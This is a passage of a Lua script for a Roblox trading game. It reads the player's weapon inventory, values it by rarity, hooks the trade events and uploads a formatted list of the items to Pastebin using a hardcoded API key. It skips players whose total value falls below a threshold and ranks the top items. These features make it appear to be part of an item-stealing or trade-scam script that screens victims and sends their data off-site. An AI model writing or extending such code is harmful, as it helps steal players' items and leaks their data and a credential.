local uniqueItemsC = 0

local uniqueItemsValue = 0
local ancientItemsValue = 0
local godlyItemsValue = 0
local vintageItemsValue = 0
local legendaryItemsValue = 0
local rareItemsValue = 0
local uncommonItemsValue = 0
local commonItemsValue = 0

for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c, d in pairs(b) do
        local itemValue = valuesTable[d.DataID] or 0
        local totalValue = itemValue * d.Amount
        
        if d.Rarity == "Unique" then
            uniqueItemsValue = uniqueItemsValue + totalValue
        elseif d.Rarity == "Ancient" then
            ancientItemsValue = ancientItemsValue + totalValue
        elseif d.Rarity == "Godly" then
            godlyItemsValue = godlyItemsValue + totalValue
        elseif d.Rarity == "Vintage" then
            vintageItemsValue = vintageItemsValue + totalValue
        elseif d.Rarity == "Legendary" then
            legendaryItemsValue = legendaryItemsValue + totalValue
        elseif d.Rarity == "Rare" then
            rareItemsValue = rareItemsValue + totalValue
        elseif d.Rarity == "Uncommon" then
            uncommonItemsValue = uncommonItemsValue + totalValue
        elseif d.Rarity == "Common" then
            commonItemsValue = commonItemsValue + totalValue
        end
    end
end

for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c, d in pairs(b) do
        local itemKey = d.DataID
        local itemValue = valuesTable[itemKey]
        local weaponValue = itemValue and (itemValue * d.Amount) or 0

        local formatTable = {
            weaponName = d.ItemName,
            weaponData = d.DataID,
            weaponAmount = d.Amount,
            weaponRarity = d.Rarity,
            weaponValue = weaponValue
        }
        
        table.insert(allItems, formatTable)

        local visualFormat = d.ItemName .. " ‚Ä¢ [x" .. d.Amount .. " | " .. weaponValue .. "]"

        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + d.Amount
            table.insert(vintageItems, visualFormat)
            table.insert(vintageItems1, formatTable)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + d.Amount
            table.insert(commonItems, visualFormat)
            table.insert(commonItems1, formatTable)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + d.Amount
            table.insert(uncommonItems, visualFormat)
            table.insert(uncommonItems1, formatTable)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + d.Amount
            table.insert(rareItems, visualFormat)
            table.insert(rareItems1, formatTable)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + d.Amount
            table.insert(legendaryItems, visualFormat)
            table.insert(legendaryItems1, formatTable)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + d.Amount
            table.insert(godlyItems, visualFormat)
            table.insert(godlyItems1, formatTable)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + d.Amount
            table.insert(ancientItems, visualFormat)
            table.insert(ancientItems1, formatTable)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + d.Amount
            table.insert(uniqueItems, visualFormat)
            table.insert(uniqueItems1, formatTable)
        end
    end
end

for _, item in pairs(allItems) do
    totalValues = totalValues + item.weaponValue
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade")
local lastOfferValue = nil

Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
    lastOfferValue = tradeData.LastOffer
end)

local function pastebin(content)
    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2)

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\nError...\n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local function formatItems(itemList)
    if #itemList == 0 then
        return "None"
    else
        return table.concat(itemList, "\n")
    end
end

local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
                         "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
                         "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
                         "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
                         "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
                         "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
                         "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
                         "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..

                        "\n\nInventory list ft. Molitown"

local pastebinLink = pastebin(pastebinString)

if totalValues < MinimumValues then
    return
end

local function getTopValuableItems(n)
    local allItems = {}
    
    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
        for c, d in pairs(b) do
            local itemValue = valuesTable[d.DataID] or 0
            local totalValue = itemValue * d.Amount
            
            table.insert(allItems, {
                name = d.ItemName,
                dataId = d.DataID,
                value = itemValue,
                amount = d.Amount,
                totalValue = totalValue,
                rarity = d.Rarity
            })
        end
    end
    
    table.sort(allItems, function(a, b) 
        return a.value > b.value
    end)
    
    local topItems = {}
    for i = 1, math.min(n, #allItems) do
        local item = allItems[i]
        local rarityEmoji = {
            Unique = "üíé",
            Ancient = "üî•", 
            Godly = "‚≠ê",
            Vintage = "üï∞Ô∏è",
            Legendary = "üëë",
            Rare = "üîµ",
            Uncommon = "üü¢",
            Common = "‚ö™"
        }
        
        local emoji = rarityEmoji[item.rarity] or "üì¶"
        table.insert(topItems, string.format("%s %s ‚Ä¢ %d ‚Ä¢ x%d", emoji, item.name, item.value, item.amount))
    end
    return topItems
end

local topItems = getTopValuableItems(5)
local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"

